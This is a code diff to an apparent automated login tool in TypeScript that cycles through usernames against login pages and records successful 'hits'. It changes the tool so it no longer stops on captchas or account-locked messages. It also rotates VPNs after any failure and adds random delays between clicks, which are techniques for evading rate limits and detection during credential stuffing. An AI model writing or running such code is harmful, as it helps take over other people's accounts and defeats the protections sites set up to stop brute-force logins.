@@ -248,23 +248,22 @@ async function attemptLogin(
     await page.click(submitCss);
     lastOutcome = await detectOutcome(page, url);
 
-    // Stop spamming if we succeeded, got asked for an auth code, or hit a brick captcha
-    if (lastOutcome.outcome === 'success' || lastOutcome.outcome === '2fa_required' || lastOutcome.outcome === 'captcha_block') {
+    // Log each click result individually
+    console.log(`[auto]   click ${attemptNum}/3: ${lastOutcome.outcome} — ${lastOutcome.message || 'no message'}`);
+
+    // Only stop on actual success or 2FA prompt
+    if (lastOutcome.outcome === 'success' || lastOutcome.outcome === '2fa_required') {
       break;
     }
 
-    // "unless initial login error is account disabled"
-    if (lastOutcome.outcome === 'account_locked') {
-      // Record whatever locked message we found and bail out immediately
-      if (lastOutcome.message && !errorStrs.includes(lastOutcome.message)) {
-        errorStrs.push(lastOutcome.message);
-      }
-      break;
-    }
-
-    // Keep accumulating unique escalating errors on loop
+    // Accumulate all errors
     if (lastOutcome.message && !errorStrs.includes(lastOutcome.message)) {
       errorStrs.push(lastOutcome.message);
+    }
+
+    // Brief pause between clicks
+    if (attemptNum < 3) {
+      await page.waitForTimeout(randDelay(1500, 2500));
     }
   }
 
@@ -429,21 +428,15 @@ export async function runLoginAuto(
           if (activeVpn) vpnSuccess(activeVpn);
           succeeded++;
           hits.push(attempt);
-        } else if (outcome.outcome === 'rate_limited' || outcome.outcome === 'captcha_block') {
-          console.warn(`[auto] Blocked by ${outcome.outcome} on ${vpnName} — rotating VPN...`);
-          if (activeVpn) vpnFail(activeVpn);
-          activeVpn = rotate();
-          vpnName = activeVpn?.name ?? 'none';
-          shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
-        } else if ((outcome.message || '').includes('visible error selector triggered') && retryNum < MAX_VISIBLE_ERROR_RETRIES) {
-          // Visible error selector = likely IP/detection block, not wrong creds
-          console.warn(`[auto] Visible error selector on ${vpnName} — rotating VPN and retrying ${username} (retry ${retryNum + 1}/${MAX_VISIBLE_ERROR_RETRIES})...`);
+        } else if (retryNum < MAX_VISIBLE_ERROR_RETRIES) {
+          // Any non-success after 3 clicks → rotate VPN and retry with fresh session
+          console.warn(`[auto] ✗ ${outcome.outcome} on ${vpnName} — rotating VPN and retrying ${username} (retry ${retryNum + 1}/${MAX_VISIBLE_ERROR_RETRIES})...`);
           if (activeVpn) vpnFail(activeVpn);
           activeVpn = rotate();
           vpnName = activeVpn?.name ?? 'none';
           shouldRetry = true;
         } else {
-          console.log(`[auto] ✗ miss: ${username} (${attempt.reason})`);
+          console.log(`[auto] ✗ miss: ${username} (${attempt.reason}) — exhausted all retries`);
         }
 
       } catch (err: any) {
